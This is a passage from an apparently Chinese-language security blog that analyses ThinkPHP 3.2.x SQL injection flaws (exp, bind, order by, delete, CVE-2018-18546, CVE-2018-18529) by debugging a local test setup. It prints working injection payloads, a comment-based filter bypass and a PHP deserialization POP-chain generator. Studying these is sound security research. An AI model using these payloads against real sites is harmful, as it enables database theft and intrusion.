index()&#123;    $User = D(&#39;Users&#39;);    $map = array(&#39;username&#39; =&gt; $_GET[&#39;username&#39;]);    // $map = array(&#39;username&#39; =&gt; I(&#39;username&#39;));    $user = $User-&gt;where($map)-&gt;find();    var_dump($user);&#125;</code></pre><p>测试</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703213910460.png" alt="image-20230703213910460"></p><p>调试:</p><p><code>username=aaa</code> –&gt; <code>find()</code>,运行到select()这里</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703214601265.png" alt="image-20230703214601265"></p><p>跟进</p><p><code>username=aaa</code> –&gt; <code>find()</code> –&gt; <code>select()</code> ,</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703214650903.png" alt="image-20230703214650903"></p><p>根进<code>buildSelectSql</code></p><p><code>username=aaa</code> –&gt; <code>find()</code> –&gt; <code>select()</code>–&gt;<code>buildSelectSql()</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703214849497.png" alt="image-20230703214849497"></p><p>没有进入if判断，直接执行<code>parseSql()</code>,跟进查看</p><p><code>username=aaa</code> –&gt; <code>find()</code> –&gt; <code>select()</code>–&gt;<code>buildSelectSql()</code>–&gt;<code>parseSql()</code></p><pre><code class="php">public function parseSql($sql, $options = array())    &#123;        $sql = str_replace(            array(&#39;%TABLE%&#39;, &#39;%DISTINCT%&#39;, &#39;%FIELD%&#39;, &#39;%JOIN%&#39;, &#39;%WHERE%&#39;, &#39;%GROUP%&#39;, &#39;%HAVING%&#39;, &#39;%ORDER%&#39;, &#39;%LIMIT%&#39;, &#39;%UNION%&#39;, &#39;%LOCK%&#39;, &#39;%COMMENT%&#39;, &#39;%FORCE%&#39;),            array(                $this-&gt;parseTable($options[&#39;table&#39;]),                $this-&gt;parseDistinct(isset($options[&#39;distinct&#39;]) ? $options[&#39;distinct&#39;] : false),                $this-&gt;parseField(!empty($options[&#39;field&#39;]) ? $options[&#39;field&#39;] : &#39;*&#39;),                $this-&gt;parseJoin(!empty($options[&#39;join&#39;]) ? $options[&#39;join&#39;] : &#39;&#39;),                $this-&gt;parseWhere(!empty($options[&#39;where&#39;]) ? $options[&#39;where&#39;] : &#39;&#39;),                $this-&gt;parseGroup(!empty($options[&#39;group&#39;]) ? $options[&#39;group&#39;] : &#39;&#39;),                $this-&gt;parseHaving(!empty($options[&#39;having&#39;]) ? $options[&#39;having&#39;] : &#39;&#39;),                $this-&gt;parseOrder(!empty($options[&#39;order&#39;]) ? $options[&#39;order&#39;] : &#39;&#39;),                $this-&gt;parseLimit(!empty($options[&#39;limit&#39;]) ? $options[&#39;limit&#39;] : &#39;&#39;),                $this-&gt;parseUnion(!empty($options[&#39;union&#39;]) ? $options[&#39;union&#39;] : &#39;&#39;),                $this-&gt;parseLock(isset($options[&#39;lock&#39;]) ? $options[&#39;lock&#39;] : false),                $this-&gt;parseComment(!empty($options[&#39;comment&#39;]) ? $options[&#39;comment&#39;] : &#39;&#39;),                $this-&gt;parseForce(!empty($options[&#39;force&#39;]) ? $options[&#39;force&#39;] : &#39;&#39;),            ), $sql);        return $sql;    &#125;</code></pre><p>部分是通过<code>parse</code>系列函数来构建SQL语句，关注点在<code>parseWhere()</code>函数，跟进到parseWhere()里面</p><p><code>username=aaa</code> –&gt; <code>find()</code> –&gt; <code>select()</code>–&gt;<code>buildSelectSql()</code>–&gt;<code>parseSql()</code>–&gt;<code>parseWhere()</code></p><p>在parseWhere()里无论进行什么操作，都会进入<code>parseWhereItem</code>,</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703220403708.png" alt="image-20230703220403708"></p><p>进入<code>parseWhereItem</code></p><p><code>username=aaa</code> –&gt; <code>find()</code> –&gt; <code>select()</code>–&gt;<code>buildSelectSql()</code>–&gt;<code>parseSql()</code>–&gt;<code>parseWhere()</code> –&gt; <code>parseWhereItem()</code></p><p>在这个方法里，发现直接拼接</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703221843199.png" alt="image-20230703221843199"></p><p>但是需要满足条件才能进入这里</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703222022145.png" alt="image-20230703222022145"></p><p>构造payload，调试一下</p><pre><code>?username[0]=exp&amp;username[1]=1</code></pre><p>成功进入</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703222152915.png" alt="image-20230703222152915"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703222237736.png" alt="image-20230703222237736"></p><p>成功拼接，但是拼接结果是</p><pre><code>`username`1</code></pre><p>缺少了<code>=</code></p><p>payload</p><pre><code>?username[0]=exp&amp;username[1]==1</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703222625578.png" alt="image-20230703222625578"></p><p>测试单引号，出现报错</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703222855437.png" alt="image-20230703222855437"></p><p>直接报错注入</p><pre><code>?username[0]=exp&amp;username[1]==1 and updatexml(1,concat(0x7e,database(),0x7e),1)</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230703223003151.png" alt="image-20230703223003151"></p><p>在开头的控制器中，使用了</p><pre><code class="php">$map = array(&#39;username&#39; =&gt; $_GET[&#39;username&#39;]);</code></pre><p>而不是</p><pre><code class="php">$map = array(&#39;username&#39; =&gt; I(&#39;username&#39;));</code></pre><p>因为<code>I()</code>方法中存在安全过滤,<code>EXP</code>被过滤了</p><pre><code class="php">function think_filter(&amp;$value)&#123;    // TODO 其他安全过滤    // 过滤查询特殊字符if (preg_match(&#39;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#39;, $value)) &#123;        $value .= &#39; &#39;;&#125;</code></pre><h3 id="3-2-3-bind注入"><a href="#3-2-3-bind注入" class="headerlink" title="3.2.3 bind注入"></a>3.2.3 bind注入</h3><p>控制器配置：这个控制器是指根据id修改对应的password</p><pre><code class="php">public function index()&#123;    $User = M(&quot;Users&quot;);    $user[&#39;id&#39;] = I(&#39;id&#39;);    $data[&#39;password&#39;] = I(&#39;password&#39;);    $valu = $User-&gt;where($user)-&gt;save($data);    var_dump($valu);&#125;</code></pre><p>测试：</p><pre><code>http://127.0.0.1/index.php?id=1&amp;password=aabb</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704091236162.png" alt="image-20230704091236162"></p><p>调试过程：</p><p><code>id=1&amp;password=aabb</code>–&gt;<code>save()</code></p><p><code>sava</code>方法前面进行数据处理，和表达式分析，后面会运行到<code>updata()</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704103705460.png" alt="image-20230704103705460"></p><p>跟进查看</p><p><code>id=1&amp;password=aabb</code>–&gt;<code>save()</code>–&gt;<code>update()</code></p><pre><code class="php">public function update($data, $options)    &#123;        $this-&gt;model = $options[&#39;model&#39;];        $this-&gt;parseBind(!empty($options[&#39;bind&#39;]) ? $options[&#39;bind&#39;] : array());        $table = $this-&gt;parseTable($options[&#39;table&#39;]);        $sql   = &#39;UPDATE &#39; . $table . $this-&gt;parseSet($data);        if (strpos($table, &#39;,&#39;)) &#123;// 多表更新支持JOIN操作            $sql .= $this-&gt;parseJoin(!empty($options[&#39;join&#39;]) ? $options[&#39;join&#39;] : &#39;&#39;);        &#125;        $sql .= $this-&gt;parseWhere(!empty($options[&#39;where&#39;]) ? $options[&#39;where&#39;] : &#39;&#39;);        if (!strpos($table, &#39;,&#39;)) &#123;            //  单表更新支持order和lmit            $sql .= $this-&gt;parseOrder(!empty($options[&#39;order&#39;]) ? $options[&#39;order&#39;] : &#39;&#39;)            . $this-&gt;parseLimit(!empty($options[&#39;limit&#39;]) ? $options[&#39;limit&#39;] : &#39;&#39;);        &#125;        $sql .= $this-&gt;parseComment(!empty($options[&#39;comment&#39;]) ? $options[&#39;comment&#39;] : &#39;&#39;);        return $this-&gt;execute($sql, !empty($options[&#39;fetch_sql&#39;]) ? true : false);    &#125;</code></pre><p>这里看到了熟悉的<code>parseWhere()</code>,在这之前,<code>$sql   = &#39;UPDATE &#39; . $table . $this-&gt;parseSet($data);</code>会构建出部分sql语句</p><p>但是sql语句是</p><pre><code>UPDATE `users` SET `password`=:0</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704104828201.png" alt="image-20230704104828201"></p><p><code>id=1&amp;password=aabb</code>–&gt;<code>save()</code>–&gt;<code>update()</code> –&gt;<code>parseWhere()</code>–&gt;<code>parseWhereItem()</code></p><p>这里的和上面exp注入差不多，想办法进入<code>bind</code>分支</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704105214858.png" alt="image-20230704105214858"></p><p>和exp注入一样修改get数据后成功进入</p><pre><code>?id[0]=bind&amp;id[1]=1&amp;password=admin123</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704105506703.png" alt="image-20230704105506703"></p><p>查看拼接后最后sql语句,这里就很有问题，反正我目前还没见过</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704105612143.png" alt="image-20230704105612143"></p><p><code>parseWhere()</code>执行完后得到了奇怪的sql语句</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704105811692.png" alt="image-20230704105811692"></p><p>在执行sql语句前的状态</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704110047806.png" alt="image-20230704110047806"></p><p>跟进<code>execute()</code>查看</p><p><code>id[0]=bind&amp;id[1]=1&amp;password=aabb</code>–&gt;<code>save()</code>–&gt;<code>update()</code> —&gt;<code>execute()</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704110455049.png" alt="image-20230704110455049"></p><p>在这条代码里</p><pre><code class="php">$this-&gt;queryStr = strtr($this-&gt;queryStr, array_map(function ($val) use ($that) &#123;return &#39;\&#39;&#39; . $that-&gt;escapeString($val) . &#39;\&#39;&#39;;&#125;, $this-&gt;bind))</code></pre><p>array_map()是执行function,$this-&gt;bind为function的参数</p><p>strtr()  把$this-&gt;queryStr字符串里面的</p><p>整个过程将</p><pre><code>UPDATE `users` SET `password`=:0 WHERE `id` = :1</code></pre><p>修改为</p><pre><code>UPDATE `users` SET `password`=&#39;admin123&#39; WHERE `id` = :1</code></pre><p><code>:0</code>变成了<code>admin123</code>,就是<code>$this-&gt;bind</code>，但是<code>:1</code>没变</p><p>如果get的是<code>id[0]=bind&amp;id[1]=0</code>,sql语句变成</p><pre><code>UPDATE `users` SET `password`=:0 WHERE `id` = :0</code></pre><p>经过替换后得到最终的sql语句</p><pre><code>UPDATE `users` SET `password`=&#39;admin123&#39; WHERE `id` = &#39;admin123&#39;</code></pre><p>然后执行</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704111630574.png" alt="image-20230704111630574"></p><p>因为整个过程中并没有对id进行过滤，只有一个<code>:0</code>替换，<code>id[1]=0</code>后面的拼接没有处理</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704112103271.png" alt="image-20230704112103271"></p><p>直接进行报错注入即可</p><pre><code>http://127.0.0.1/index.php?id[0]=bind&amp;password=admin123&amp;id[1]=0 and updatexml(1,concat(0x7e,database(),0x7e),1)</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704112211737.png" alt="image-20230704112211737"></p><h3 id="3-2-3-order-by注入"><a href="#3-2-3-order-by注入" class="headerlink" title="3.2.3  order by注入"></a>3.2.3  order by注入</h3><p>先在2.3.4跟新的地方，发现parseOrder存在大量跟新,漏洞大概率出现在这</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704125431131.png" alt="image-20230704125431131"></p><p>控制器：</p><pre><code class="PHP"> public function index()&#123;        $username = I(&quot;username&quot;);        $order = I(&quot;order&quot;);        $data = M(&quot;users&quot;)-&gt;where(array(&quot;username&quot;=&gt;$username))-&gt;order($order)-&gt;find();        dump($data);    &#125;</code></pre><p>M只是实例化users对象，不管了，where也不是我们的利用点，我们也没对其进行操作，因此也跳过</p><p><strong>疑问： order($order)是干嘛的？</strong>，只知道是给$order赋值</p><p><code>username=admin&amp;order=1</code> –&gt;<code>find()</code>–&gt;<code>select()</code>–&gt;<code>buildSelectSql()</code>–&gt;<code>parseSql()</code></p><p>在这里找到了<code>parseOrder</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704131151548.png" alt="image-20230704131151548"></p><p>跟进<code>parseOrder</code></p><pre><code class="php">protected function parseOrder($order)    &#123;        if (is_array($order)) &#123;            $array = array();            foreach ($order as $key =&gt; $val) &#123;                if (is_numeric($key)) &#123;                    $array[] = $this-&gt;parseKey($val);                &#125; else &#123;                    $array[] = $this-&gt;parseKey($key) . &#39; &#39; . $val;                &#125;            &#125;            $order = implode(&#39;,&#39;, $array);        &#125;        return !empty($order) ? &#39; ORDER BY &#39; . $order : &#39;&#39;;    &#125;</code></pre><p>这里首先会判断$order是不是数组，如果不是，返回拼接，如果$order不为空，则拼接ORDER BY</p><p>因为没有过滤，造成了sql注入</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704131936741.png" alt="image-20230704131936741"></p><p>这里可以直接注入了</p><pre><code>?username=admin&amp;order=1 and updatexml(1,concat(0x3a,database()),1)</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704132307868.png" alt="image-20230704132307868"></p><h3 id="3-2-3-update注入"><a href="#3-2-3-update注入" class="headerlink" title="3.2.3  update注入"></a>3.2.3  update注入</h3><p> 看来网上的分析文章，其实就是上面分析的bind注入</p><h3 id="3-2-3-delete注入"><a href="#3-2-3-delete注入" class="headerlink" title="3.2.3  delete注入"></a>3.2.3  delete注入</h3><p>(感觉还是where注入)</p><p>控制器：</p><pre><code class="php">public function index()&#123;        $id = I(&quot;id&quot;);        $res = M(&quot;users&quot;)-&gt;delete($id);    &#125;</code></pre><p><code>id=5</code>–&gt;<code>delete()</code>–&gt;<code>delete()</code></p><p>在这个方法里也是调用了一系列的parse方法，去构建sql语句</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704141846044.png" alt="image-20230704141846044"></p><p><code>id=5</code>–&gt;<code>delete()</code>–&gt;<code>delete()</code>–&gt;<code>parseWhere()</code>–&gt;<code>parseWhereItem()</code></p><p>经过这个方法后会构建出<code>WHERE id=5</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704142845933.png" alt="image-20230704142845933"></p><p>尝试直接注入，得到奇怪的语句</p><pre><code>id= 5%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704143310018.png" alt="image-20230704143310018"></p><p>查看<code>parseWhere()</code>，如果传进的参数如果是字符串，而不是数组，就不会进入else，产生那个奇怪的sql语句</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704143837865.png" alt="image-20230704143837865"></p><p><code>id[where]=5</code>,这个能进入if判断</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704144109802.png" alt="image-20230704144109802"></p><p>然后直接跳转到最后的拼接，得到<code>where 5</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704144143733.png" alt="image-20230704144143733"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704144231873.png" alt="image-20230704144231873"></p><p>然后就进行注入尝试</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704144328843.png" alt="image-20230704144328843"></p><p>似乎可以，报错注入</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704144425948.png" alt="image-20230704144425948"></p><pre><code>http://127.0.0.1/index.php?id[where]=5 and updatexml(1,concat(0x7e,database(),0x7e),1)</code></pre><h3 id="3-2-3-反序列化"><a href="#3-2-3-反序列化" class="headerlink" title="3.2.3 反序列化"></a>3.2.3 反序列化</h3><p>(感觉还是sql注入)</p><p>控制器:</p><pre><code class="php">public function index()&#123;    unserialize(base64_decode($_GET[&#39;ser&#39;]));&#125;</code></pre><p>先找<code>__destruct</code>,因为这个魔法方法当反序列化时先调用，全局搜索后,</p><p>找到<code>ThinkPHP/Library/Think/Image/Driver/Imagick.class.php</code></p><pre><code class="php"> public function __destruct()    &#123;        empty($this-&gt;img) || $this-&gt;img-&gt;destroy();    &#125;</code></pre><p>这个img可以控制</p><p>下一步就行找到一个能够调用<code>destroy</code>的类</p><p>在<code>ThinkPHP/Library/Think/Session/Driver/Memcache.class.php</code></p><pre><code class="php">public function destroy($sessID)&#123;        return $this-&gt;handle-&gt;delete($this-&gt;sessionName . $sessID);&#125;</code></pre><p>$this-&gt;handle可控，但是这是有参函数，在php7调用有参函数时不传参数会触发框架里的错误处理，切换php5就行</p><p>下一步，找到delete()方法，在<code>ThinkPHP/Mode/Lite/Model.class.php</code></p><pre><code class="php">public function delete($options = array())    &#123;          &#125;</code></pre><p>这个就是前面分析sql注入的delete方法</p><p>里面会调用<code>ThinkPHP/Library/Think/Db/Driver.class.php</code>的delete方法</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704153926320.png" alt="image-20230704153926320"></p><pre><code>public function delete($options = array())    &#123;        $this-&gt;model = $options[&#39;model&#39;];        $this-&gt;parseBind(!empty($options[&#39;bind&#39;]) ? $options[&#39;bind&#39;] : array());        $table = $this-&gt;parseTable($options[&#39;table&#39;]);        $sql   = &#39;DELETE FROM &#39; . $table;        if (strpos($table, &#39;,&#39;)) &#123;// 多表删除支持USING和JOIN操作            if (!empty($options[&#39;using&#39;])) &#123;                $sql .= &#39; USING &#39; . $this-&gt;parseTable($options[&#39;using&#39;]) . &#39; &#39;;            &#125;            $sql .= $this-&gt;parseJoin(!empty($options[&#39;join&#39;]) ? $options[&#39;join&#39;] : &#39;&#39;);        &#125;        $sql .= $this-&gt;parseWhere(!empty($options[&#39;where&#39;]) ? $options[&#39;where&#39;] : &#39;&#39;);        if (!strpos($table, &#39;,&#39;)) &#123;            // 单表删除支持order和limit            $sql .= $this-&gt;parseOrder(!empty($options[&#39;order&#39;]) ? $options[&#39;order&#39;] : &#39;&#39;)            . $this-&gt;parseLimit(!empty($options[&#39;limit&#39;]) ? $options[&#39;limit&#39;] : &#39;&#39;);        &#125;        $sql .= $this-&gt;parseComment(!empty($options[&#39;comment&#39;]) ? $options[&#39;comment&#39;] : &#39;&#39;);        return $this-&gt;execute($sql, !empty($options[&#39;fetch_sql&#39;]) ? true : false);    &#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704154233230.png" alt="image-20230704154233230"></p><p>这里存在一个sql语句直接拼接，而且在前面的分析中没有对参数过滤，可以尝试用反序列化链造成sql注入</p><p>在执行sql语句时，会调用<code>initConnect</code>进行初始化连接</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704154710379.png" alt="image-20230704154710379"></p><p>跟进<code>initConnect</code>,</p><pre><code class="php">protected function initConnect($master = true)    &#123;        if (!empty($this-&gt;config[&#39;deploy&#39;]))        // 采用分布式数据库        &#123;            $this-&gt;_linkID = $this-&gt;multiConnect($master);        &#125; else        // 默认单数据库        if (!$this-&gt;_linkID) &#123;            $this-&gt;_linkID = $this-&gt;connect();        &#125;    &#125;</code></pre><p>跟进connect,这个$this-&gt;config可控</p><pre><code class="php">public function connect($config = &#39;&#39;, $linkNum = 0, $autoConnection = false)    &#123;        if (!isset($this-&gt;linkID[$linkNum])) &#123;            if (empty($config)) &#123;                $config = $this-&gt;config;            &#125;            try &#123;                if (empty($config[&#39;dsn&#39;])) &#123;                    $config[&#39;dsn&#39;] = $this-&gt;parseDsn($config);                &#125;                if (version_compare(PHP_VERSION, &#39;5.3.6&#39;, &#39;&lt;=&#39;)) &#123;                    // 禁用模拟预处理语句                    $this-&gt;options[PDO::ATTR_EMULATE_PREPARES] = false;                &#125;                $this-&gt;linkID[$linkNum] = new PDO($config[&#39;dsn&#39;], $config[&#39;username&#39;], $config[&#39;password&#39;], $this-&gt;options);            &#125; catch (\PDOException $e) &#123;                if ($autoConnection) &#123;                    trace($e-&gt;getMessage(), &#39;&#39;, &#39;ERR&#39;);                    return $this-&gt;connect($autoConnection, $linkNum);                &#125; elseif ($config[&#39;debug&#39;]) &#123;                    E($e-&gt;getMessage());                &#125;            &#125;        &#125;        return $this-&gt;linkID[$linkNum];    &#125;</code></pre><p>按照思路，构造POP链</p><pre><code>__destruct()-&gt;destroy()-&gt;delete()-&gt;Driver::delete()-&gt;Driver::execute()-&gt;Driver::initConnect()-&gt;Driver::connect()</code></pre><pre><code class="php">&lt;?php//初始化数据库连接namespace Think\Db\Driver&#123;    use PDO;    class Mysql&#123;        protected $config = array(            &quot;debug&quot;    =&gt; 1,            &quot;database&quot; =&gt; &quot;thinkphp&quot;,//数据库名            &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;,//地址            &quot;hostport&quot; =&gt; &quot;3306&quot;,//端口            &quot;charset&quot;  =&gt; &quot;utf8&quot;,            &quot;username&quot; =&gt; &quot;root&quot;,//用户名            &quot;password&quot; =&gt; &quot;123456&quot;//密码        );    &#125;&#125;namespace Think\Image\Driver&#123;    use Think\Session\Driver\Memcache;    class Imagick&#123;        private $img;        public function __construct()&#123;            $this-&gt;img = new Memcache();        &#125;    &#125;&#125;namespace Think\Session\Driver&#123;    use Think\Model;    class Memcache&#123;        protected $handle;        public function __construct()&#123;            $this-&gt;handle = new Model();        &#125;    &#125;&#125;namespace Think&#123;    use Think\Db\Driver\Mysql;    class Model&#123;        protected $options   = array();        protected $pk;        protected $data = array();        protected $db = null;        public function __construct()&#123;            $this-&gt;db = new Mysql();            $this-&gt;options[&#39;where&#39;] = &#39;&#39;;            $this-&gt;pk = &#39;id&#39;;            $this-&gt;data[$this-&gt;pk] = array(                &quot;table&quot; =&gt; &quot;users where 1 and updatexml(1,concat(0x7e,database(),0x7e),1)#&quot;,                &quot;where&quot; =&gt; &quot;1=1&quot;            );        &#125;    &#125;&#125;namespace &#123;    echo base64_encode(serialize(new Think\Image\Driver\Imagick()));&#125;</code></pre><h3 id="3-2-4-CVE-2018-18546（上面Order-by注入的绕过）"><a href="#3-2-4-CVE-2018-18546（上面Order-by注入的绕过）" class="headerlink" title="3.2.4 CVE-2018-18546（上面Order by注入的绕过）"></a>3.2.4 CVE-2018-18546（上面Order by注入的绕过）</h3><p>控制器：</p><pre><code class="php">public function index()    &#123;        $obj = M(&#39;users&#39;);        $res = $obj-&gt;where(&#39;id=1&#39;)-&gt;order(I(&#39;id&#39;))-&gt;select();        echo $obj-&gt;getLastSql();//输出sql语句    &#125;</code></pre><p>描述：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707202352932.png" alt="image-20230707202352932"></p><p>版本:3.2.4和3.2.5对比</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707202509308.png" alt="image-20230707202509308"></p><p>这部分代码是漏洞出现的地方，也就是对order拼接前进行过滤处理的地方</p><pre><code class="php">foreach (explode(&#39;,&#39;, $order) as $val) &#123;     if (preg_match(&#39;/\s+(ASC|DESC)$/i&#39;, rtrim($val), $match, PREG_OFFSET_CAPTURE)) &#123;            $array[] = $this-&gt;parseKey(ltrim(substr($val, 0, $match[0][1]))) . &#39; &#39; . $match[1][0];       &#125; elseif (false === strpos($val, &#39;(&#39;)) &#123;            $array[] = $this-&gt;parseKey($val);        &#125;</code></pre><p>这个代码首先将$order进行以逗号<code>,</code>进行分割为数组，然后遍历这个数组</p><p>然后按照不同规则进行处理，</p><p>第一个是使用 <code>rtrim</code> 函数去除 <code>$val</code> 右侧的空格，并将结果作为 <code>preg_match</code> 函数的第二个参数。匹配结果将存储在数组 <code>$match</code> 中，然后使用 <code>substr</code> 函数截取出 <code>$val</code> 中 <code>$match[0][1]</code> 之前的部分（即去除了 <code>ASC</code> 或 <code>DESC</code> 部分），然后使用 <code>ltrim</code> 函数去除左侧的空格。使用 <code>$this-&gt;parseKey</code> 方法对处理后的部分进行进一步解析，并将结果与匹配到的排序方式（<code>ASC</code> 或 <code>DESC</code>）拼接成字符串，最后将其添加到数组 <code>$array</code> 中。</p><p>第二个是使用 <code>strpos</code> 函数检查 <code>$val</code> 中是否包含左括号 <code>&#39;(&#39;</code>。如果不包含，则执行以下代码块。这里调用了 <code>$this-&gt;parseKey</code> 方法对 <code>$val</code> 进行解析，并将解析结果添加到数组 <code>$array</code> 中</p><p>确保前面没有过滤后，直接在这段代码进行下断点调试：</p><pre><code>输入：?id=updatexml(1,concat(0x7e,database(),0x7e),1)</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707211520419.png" alt="image-20230707211520419"></p><p>这个会被分割为</p><pre><code>[&#39;updatexml(1&#39;,&#39;concat(0x7e&#39;,&#39;database()&#39;,&#39;0x7e)&#39;,&#39;1)]</code></pre><p>经过过滤处理最终满足条件的就只有最后两个</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707210348075.png" alt="image-20230707210348075"></p><p>为了让数组中每一位都能满足条件需要进行绕过：存在<code>(</code>的，使用sql语句中的注释进行绕过，在注释中添加<code>ASC</code>或者<code>DESC</code>，使得它走的是第一个if</p><p>不存在<code>(</code>的，适当构建<code>/**/</code>和<code>,</code> ,为了构造分割和sql语句注释的完整</p><pre><code>[&#39;updatexml(1&#39;,&#39;concat(0x7e&#39;,&#39;database()&#39;,&#39;0x7e)&#39;,&#39;1)]</code></pre><p> 处理后的数组：</p><pre><code>[&#39;updatexml/*&#39;,&#39;*/(/*%20ASC&#39;,&#39;*/1&#39;,&#39;concat/*&#39;,&#39;*/(/*%20ASC&#39;,&#39;*/0x7e&#39;,&#39;database/*&#39;,&#39;*/(/*%20ASC&#39;,&#39;*/)&#39;,&#39;0x7e)&#39;,&#39;1)]</code></pre><p>最后的payload：</p><pre><code>updatexml/*,*/(/*%20ASC,*/1,concat/*,*/(/*%20ASC,*/0x7e,database/*,*/(/*%20ASC,*/),0x7e),1)</code></pre><p>成功绕过：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707211835078.png" alt="image-20230707211835078"></p><p>后面就是将order拼接<code>ORDER BY</code> 拼接到sql语句中执行了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707211923350.png" alt="image-20230707211923350"></p><h3 id="3-2-4-CVE-2018-18529"><a href="#3-2-4-CVE-2018-18529" class="headerlink" title="3.2.4 CVE-2018-18529"></a>3.2.4 CVE-2018-18529</h3><p>漏洞描述：ThinkPHP 3.2.4存在SQL注入漏洞，该漏洞是由于Library&#x2F;Think&#x2F;Db&#x2F;Driver&#x2F;Mysql.class.php文件中的parseKey函数对key变量处理不当所致。注意：攻击URI中不需要使用反引号字符</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707212638957.png" alt="image-20230707212638957"></p><p>对比官方的修复:</p><p>这里是添加了对$key变量的过滤</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707213059131.png" alt="image-20230707213059131"></p><p>这个函数在sql相操作中频繁使用 ，下面是完整代码：</p><pre><code class="php">protected function parseKey($key, $strict = false)    &#123;        $key = trim($key);        if ($strict || (!is_numeric($key) &amp;&amp; !preg_match(&#39;/[,\&#39;\&quot;\*\(\)`.\s]/&#39;, $key))) &#123;            $key = &#39;`&#39; . $key . &#39;`&#39;;        &#125;        return $key;    &#125;</code></pre><p>首先，代码使用trim函数去除$key的首尾空格，确保处理的字符串没有多余的空白字符。</p><p>接下来，通过条件判断语句，检查strict的值和和key的内容，决定是否对$key进行进一步处理。</p><p>如果strict为true，或者key不是一个数字，并且不匹配正则表达式（该正则表达式用于检查$key中是否包含逗号、单引号、双引号、星号、括号、反引号、点号或空白字符），则执行下面的代码块。</p><p>在这个代码块中key前后分别添加了反引号（‘），形成了一个包裹着key的字符串。这样做是为了在后续的数据库查询中使用$key作为字段名或表名时，确保其被正确解析和识别。</p><p>最后，返回经过处理的$key。</p><p>可以看到，这个函数无论如何都会返回$key, 说明这里构造恶意的$key也会正常返回</p><p>测试：</p><p>控制器如下：</p><pre><code class="php">public function index()    &#123;        $count = I(&#39;get.count&#39;);        $m = M(&#39;users&#39;)-&gt;count($count);        echo $m;    &#125;</code></pre><pre><code>?count=id</code></pre><p>在这个函数断点调试</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707230038151.png" alt="image-20230707230038151"></p><p>程序第一次获取到的key是数据库中的表名，并且满足if条件将其添加反引号返回</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707230249953.png" alt="image-20230707230249953"></p><p>第二次获取到的是<code>COUNT(id) AS tp_count</code> 直接返回，这个是由于调用count的时候触发ThinkPHP&#x2F;Library&#x2F;Think&#x2F;Model.class.php::__call()</p><p>在调用<code>getField</code>的时候进行的拼接</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707231116054.png" alt="image-20230707231116054"></p><p>当执行sql语句前，获取到的sql语句如下：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707231602039.png" alt="image-20230707231602039"></p><p>可以直接根据这个进行构造sql语句进行注入</p><pre><code class="php">?count=id) or (select database()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707232743059.png" alt="image-20230707232743059"></p><p>sqlmap：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707232815182.png" alt="image-20230707232815182"></p><h3 id="3-1-3-CVE-2018-10225"><a href="#3-1-3-CVE-2018-10225" class="headerlink" title="3.1.3 CVE-2018-10225"></a>3.1.3 CVE-2018-10225</h3><p>（环境出错）</p><h2 id="ThinkPHP-5-x"><a href="#ThinkPHP-5-x" class="headerlink" title="ThinkPHP 5.x"></a>ThinkPHP 5.x</h2><p>开发手册：<a 